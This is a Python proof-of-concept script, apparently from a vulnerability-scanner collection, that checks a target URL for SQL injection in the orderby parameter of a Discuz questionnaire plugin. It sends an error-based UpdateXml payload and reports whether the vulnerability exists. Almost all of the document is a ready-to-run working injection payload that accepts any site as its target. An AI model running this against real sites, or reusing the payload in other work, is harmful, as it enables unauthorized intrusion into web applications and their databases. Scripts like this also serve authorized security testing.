
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: discuz问卷调查参数orderby注入漏洞
referer: http://0day5.com/archives/3184/
author: Lucifer
description: 文件plugin.php中,参数orderby存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['discuz问卷调查参数orderby注入漏洞', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline/**/And/**/1=(UpdateXml(1,ConCat(0x7e,Md5(1234)),1))--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed05" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
